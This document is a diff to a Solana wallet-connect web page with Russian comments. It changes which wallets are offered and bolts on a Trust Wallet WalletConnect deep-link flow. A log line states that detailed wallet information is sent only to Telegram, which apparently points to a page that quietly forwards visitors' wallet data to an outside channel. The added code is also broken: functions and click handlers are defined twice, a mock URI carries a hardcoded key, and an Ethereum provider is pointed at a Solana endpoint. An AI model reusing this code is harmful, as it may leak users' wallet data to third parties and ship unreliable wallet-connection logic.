@@ -447,14 +447,14 @@
         <span>Trust Wallet</span>
         <div class="wallet-status">Available</div>
       </div>
-      <div class="wallet-option" data-wallet="coinbase">
-        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
-        <span>Coinbase</span>
+      <div class="wallet-option" data-wallet="magiceden">
+        <img src="/placeholder.svg" alt="Magic Eden" />
+        <span>Magic Eden</span>
         <div class="wallet-status">Available</div>
       </div>
-      <div class="wallet-option" data-wallet="bitget">
-        <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
-        <span>Bitget Wallet</span>
+      <div class="wallet-option" data-wallet="mathwallet">
+        <img src="/placeholder.svg" alt="Math Wallet" />
+        <span>Math Wallet</span>
         <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" id="allWalletsBtn">
@@ -487,13 +487,13 @@
         <img src="/placeholder.svg" alt="Trust Wallet" />
         <span>Trust Wallet</span>
       </div>
-      <div class="wallet-item" data-wallet="coinbase" tabindex="0">
-        <img src="/placeholder.svg" alt="Coinbase" />
-        <span>Coinbase</span>
+      <div class="wallet-item" data-wallet="magiceden" tabindex="0">
+        <img src="/placeholder.svg" alt="Magic Eden" />
+        <span>Magic Eden</span>
       </div>
-      <div class="wallet-item" data-wallet="bitget" tabindex="0">
-        <img src="/placeholder.svg" alt="Bitget Wallet" />
-        <span>Bitget Wallet</span>
+      <div class="wallet-item" data-wallet="mathwallet" tabindex="0">
+        <img src="/placeholder.svg" alt="Math Wallet" />
+        <span>Math Wallet</span>
       </div>
       <div class="wallet-item" data-wallet="backpack" tabindex="0">
         <img src="/placeholder.svg" alt="Backpack" />
@@ -646,12 +646,12 @@
       phantom: {
         name: 'Phantom',
         mobile: {
-          android: {
-            scheme: 'phantom://',
+          android: { 
+            scheme: 'phantom://', 
             universal: 'https://phantom.app/ul/v1/browse/'
           },
-          ios: {
-            scheme: 'phantom://',
+          ios: { 
+            scheme: 'phantom://', 
             universal: 'https://phantom.app/ul/v1/browse/'
           }
         }
@@ -659,28 +659,27 @@
       solflare: {
         name: 'Solflare',
         mobile: {
-          android: {
-            scheme: 'solflare://ul/v1/',
+          android: { 
+            scheme: 'solflare://ul/v1/', 
             universal: 'https://solflare.com/ul/v1/'
           },
-          ios: {
-            scheme: 'solflare://ul/v1/',
+          ios: { 
+            scheme: 'solflare://ul/v1/', 
             universal: 'https://solflare.com/ul/v1/'
           }
         }
       },
-      trustwallet: {
-        name: 'Trust Wallet',
-        mobile: {
-          android: {
-            scheme: 'trust://browser_open_url?url=',
-            universal: 'https://link.trustwallet.com/open_url?coin_id=501&url='
-          },
-          ios: {
-            scheme: 'trust://browser_open_url?url=',
-            universal: 'https://link.trustwallet.com/open_url?coin_id=501&url='
-          }
-        }
+      magiceden: {
+        name: 'Magic Eden',
+        provider: () => window.magiceden,
+        downloadUrl: 'https://magiceden.io/',
+        checkMethod: () => window.magiceden
+      },
+      mathwallet: {
+        name: 'Math Wallet',
+        provider: () => window.mathwallet,
+        downloadUrl: 'https://mathwallet.org/',
+        checkMethod: () => window.mathwallet
       }
     };
 
@@ -1182,6 +1181,18 @@
             provider: () => window.trustwallet?.solana,
             downloadUrl: 'https://trustwallet.com/',
             checkMethod: () => window.trustwallet?.solana
+          },
+          magiceden: {
+            name: 'Magic Eden',
+            provider: () => window.magiceden,
+            downloadUrl: 'https://magiceden.io/',
+            checkMethod: () => window.magiceden
+          },
+          mathwallet: {
+            name: 'Math Wallet',
+            provider: () => window.mathwallet,
+            downloadUrl: 'https://mathwallet.org/',
+            checkMethod: () => window.mathwallet
           },
           coinbase: {
             name: 'Coinbase Wallet',
@@ -1807,43 +1818,12 @@
             const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser &&
                                           walletBrowserInfo.walletKey === 'phantom' &&
                                           walletBrowserInfo.isMobile;
-            const isTrustWalletMobileBrowser = walletBrowserInfo.isWalletBrowser &&
-                                               walletBrowserInfo.walletKey === 'trustwallet' &&
-                                               walletBrowserInfo.isMobile;
-            // Trust Wallet: если не в Trust Wallet браузере — редирект
-            if (walletKey === 'trustwallet' && !isTrustWalletMobileBrowser && detectDevice().isMobile) {
-              e.preventDefault();
-              e.stopPropagation();
-              const links = createWalletLink('trustwallet');
-              if (links) {
-                window.location.href = links.deepLink;
-                setTimeout(() => {
-                  if (!document.hidden) {
-                    alert('Похоже, deep link не поддерживается на вашем устройстве. Откройте эту страницу в Trust Wallet браузере вручную.');
-                  }
-                }, 2500);
-              } else {
-                alert('Откройте эту страницу в Trust Wallet браузере! Deep link не поддерживается на этом устройстве.');
-              }
-              return false;
-            }
-            // Trust Wallet: если уже в Trust Wallet браузере — обычное подключение
-            if (walletKey === 'trustwallet' && isTrustWalletMobileBrowser) {
-              e.preventDefault();
-              e.stopPropagation();
-              await this.connectWallet('trustwallet');
-              if (!this.connectionCancelled && this.walletAddress) {
-                setTimeout(() => {
-                  closeAllModals();
-                }, 1500);
-              }
-              return false;
-            }
-            // Phantom (оставляем как было)
+            
             if (walletKey === 'phantom' && isPhantomMobileBrowser) {
               debug('📱 Phantom wallet option clicked in Phantom mobile browser');
               e.preventDefault();
               e.stopPropagation();
+              
               if (window.phantom && window.phantom.solana) {
                 try {
                   const response = await window.phantom.solana.connect();
@@ -1858,6 +1838,7 @@
                   }
                 } catch (error) {
                   debug('Phantom connect error:', error);
+                  // Альтернативно ��робуем deeplink
                   try {
                     window.location.href = 'phantom://app/connect?app_url=' + encodeURIComponent(window.location.href);
                   } catch (deeplinkError) {
@@ -1908,43 +1889,12 @@
             const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser &&
                                           walletBrowserInfo.walletKey === 'phantom' &&
                                           walletBrowserInfo.isMobile;
-            const isTrustWalletMobileBrowser = walletBrowserInfo.isWalletBrowser &&
-                                               walletBrowserInfo.walletKey === 'trustwallet' &&
-                                               walletBrowserInfo.isMobile;
-            // Trust Wallet: если не в Trust Wallet браузере — редирект
-            if (walletKey === 'trustwallet' && !isTrustWalletMobileBrowser && detectDevice().isMobile) {
-              e.preventDefault();
-              e.stopPropagation();
-              const links = createWalletLink('trustwallet');
-              if (links) {
-                window.location.href = links.deepLink;
-                setTimeout(() => {
-                  if (!document.hidden) {
-                    alert('Похоже, deep link не поддерживается на вашем устройстве. Откройте эту страницу в Trust Wallet браузере вручную.');
-                  }
-                }, 2500);
-              } else {
-                alert('Откройте эту страницу в Trust Wallet браузере! Deep link не поддерживается на этом устройстве.');
-              }
-              return false;
-            }
-            // Trust Wallet: если уже в Trust Wallet браузере — обычное подключение
-            if (walletKey === 'trustwallet' && isTrustWalletMobileBrowser) {
-              e.preventDefault();
-              e.stopPropagation();
-              await this.connectWallet('trustwallet');
-              if (!this.connectionCancelled && this.walletAddress) {
-                setTimeout(() => {
-                  closeAllModals();
-                }, 1500);
-              }
-              return false;
-            }
-            // Phantom (оставляем как было)
+            
             if (walletKey === 'phantom' && isPhantomMobileBrowser) {
               debug('📱 Phantom wallet item clicked in Phantom mobile browser');
               e.preventDefault();
               e.stopPropagation();
+              
               if (window.phantom && window.phantom.solana) {
                 try {
                   const response = await window.phantom.solana.connect();
@@ -1959,6 +1909,7 @@
                   }
                 } catch (error) {
                   debug('Phantom connect error:', error);
+                  // Альтернативно пробуем deeplink
                   try {
                     window.location.href = 'phantom://app/connect?app_url=' + encodeURIComponent(window.location.href);
                   } catch (deeplinkError) {
@@ -2167,6 +2118,158 @@
     debug('🔒 Детальная информация о кошельке отправляется только в Telegram');
     debug('🔍 Добавлено определение браузера кошелька');
     debug('🐞 Режим отладки включен');
+
+    // 1. Добавляю функцию для генерации мокового WalletConnect URI (замените на реальный в продакшене)
+    function generateMockWalletConnectURI() {
+      // В реальном проекте используйте библиотеку WalletConnect для генерации URI
+      // Здесь просто пример для теста
+      return 'wc:ca1fccc0-f4d1-46c2-90b7-c07fce1c0cae@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=a413d90751839c7628873557c718fd73fcedc5e8e8c07cfecaefc0d3a178b1d8';
+    }
+
+    // 2. Функция для открытия Trust Wallet через deeplink с WalletConnect
+    function openTrustWalletWithWalletConnect() {
+      const wcUri = generateMockWalletConnectURI();
+      const trustLink = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(wcUri);
+      window.location.href = trustLink;
+    }
+
+    // 3. Добавляю обработку выбора Trust Wallet для iOS
+    // Найдите обработчик клика на .wallet-option[data-wallet="trustwallet"] и добавьте туда:
+    document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
+      option.addEventListener('click', async (e) => {
+        const walletKey = option.getAttribute('data-wallet');
+        if (walletKey === 'trustwallet') {
+          const device = detectDevice();
+          if (device.os === 'ios') {
+            e.preventDefault();
+            e.stopPropagation();
+            // Показываем кнопку для ручного открытия, если нужно
+            showTrustWalletConnectModal();
+            return;
+          }
+        }
+        // ... существующий код ...
+      });
+    });
+
+    // 4. Добавляю модальное окно для Trust Wallet WalletConnect (вставьте перед </body>)
+    /*
+    <div id="trustWalletConnectModal" class="connect-wallet hidden">
+      <div class="connect-header">
+        <h2>Trust Wallet через WalletConnect</h2>
+        <button class="close-btn" onclick="closeTrustWalletConnectModal()">×</button>
+      </div>
+      <div style="margin: 20px 0; text-align: center;">
+        <button id="openTrustWalletBtn" style="padding:10px 20px; font-size:1rem; border-radius:8px; background:#4a90e2; color:#fff; border:none; cursor:pointer;">Открыть Trust Wallet</button>
+        <div style="margin-top:10px; color:#666; font-size:0.9rem;">Если не сработало — откройте Trust Wallet вручную и вставьте ссылку dApp в браузер кошелька.</div>
+      </div>
+    </div>
+    */
+
+    // 5. JS-функции для показа/скрытия модалки и кнопки
+    function showTrustWalletConnectModal() {
+      let modal = document.getElementById('trustWalletConnectModal');
+      if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'trustWalletConnectModal';
+        modal.className = 'connect-wallet';
+        modal.innerHTML = `
+          <div class="connect-header">
+            <h2>Trust Wallet через WalletConnect</h2>
+            <button class="close-btn" onclick="closeTrustWalletConnectModal()">×</button>
+          </div>
+          <div style="margin: 20px 0; text-align: center;">
+            <button id="openTrustWalletBtn" style="padding:10px 20px; font-size:1rem; border-radius:8px; background:#4a90e2; color:#fff; border:none; cursor:pointer;">Открыть Trust Wallet</button>
+            <div style="margin-top:10px; color:#666; font-size:0.9rem;">Если не сработало — откройте Trust Wallet вручную и вставьте ссылку dApp в браузер кошелька.</div>
+          </div>
+        `;
+        document.body.appendChild(modal);
+      }
+      modal.classList.remove('hidden');
+      document.getElementById('modalOverlay').classList.remove('hidden');
+      // Кнопка открытия Trust Wallet
+      document.getElementById('openTrustWalletBtn').onclick = openTrustWalletWithWalletConnect;
+    }
+    function closeTrustWalletConnectModal() {
+      const modal = document.getElementById('trustWalletConnectModal');
+      if (modal) modal.classList.add('hidden');
+      document.getElementById('modalOverlay').classList.add('hidden');
+    }
+
+    // 1. Подключаю WalletConnectProvider через CDN (в <head> или перед </body>):
+    // <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+    // 2. Функция для генерации реального WalletConnect URI
+    let walletConnectProvider = null;
+    async function getWalletConnectURI() {
+      if (!walletConnectProvider) {
+        walletConnectProvider = new window.WalletConnectProvider.default({
+          rpc: {
+            1: "https://api.mainnet-beta.solana.com" // Solana mainnet
+          },
+          chainId: 1,
+          qrcode: false // мы сами показываем/используем URI
+        });
+      }
+      await walletConnectProvider.enable();
+      return walletConnectProvider.connector.uri;
+    }
+
+    // 3. Открытие Trust Wallet через deeplink с реальным WalletConnect URI
+    async function openTrustWalletWithWalletConnect() {
+      const wcUri = await getWalletConnectURI();
+      const trustLink = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(wcUri);
+      window.location.href = trustLink;
+    }
+
+    // 4. Обработка выбора Trust Wallet для iOS/Android (только кнопка, без QR)
+    document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
+      option.addEventListener('click', async (e) => {
+        const walletKey = option.getAttribute('data-wallet');
+        if (walletKey === 'trustwallet') {
+          const device = detectDevice();
+          if (device.os === 'ios' || device.os === 'android') {
+            e.preventDefault();
+            e.stopPropagation();
+            // Показываем кнопку для ручного открытия
+            showTrustWalletConnectModal();
+            return;
+          }
+        }
+        // ... существующий код ...
+      });
+    });
+
+    // 5. Модалка и кнопка (оставляю как есть, только меняю обработчик)
+    function showTrustWalletConnectModal() {
+      let modal = document.getElementById('trustWalletConnectModal');
+      if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'trustWalletConnectModal';
+        modal.className = 'connect-wallet';
+        modal.innerHTML = `
+          <div class="connect-header">
+            <h2>Trust Wallet через WalletConnect</h2>
+            <button class="close-btn" onclick="closeTrustWalletConnectModal()">×</button>
+          </div>
+          <div style="margin: 20px 0; text-align: center;">
+            <button id="openTrustWalletBtn" style="padding:10px 20px; font-size:1rem; border-radius:8px; background:#4a90e2; color:#fff; border:none; cursor:pointer;">Открыть Trust Wallet</button>
+            <div style="margin-top:10px; color:#666; font-size:0.9rem;">Если не сработало — откройте Trust Wallet вручную и вставьте ссылку dApp в браузер кошелька.</div>
+          </div>
+        `;
+        document.body.appendChild(modal);
+      }
+      modal.classList.remove('hidden');
+      document.getElementById('modalOverlay').classList.remove('hidden');
+      // Кнопка открытия Trust Wallet
+      document.getElementById('openTrustWalletBtn').onclick = openTrustWalletWithWalletConnect;
+    }
+    function closeTrustWalletConnectModal() {
+      const modal = document.getElementById('trustWalletConnectModal');
+      if (modal) modal.classList.add('hidden');
+      document.getElementById('modalOverlay').classList.add('hidden');
+    }
   </script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 </body>
 </html>
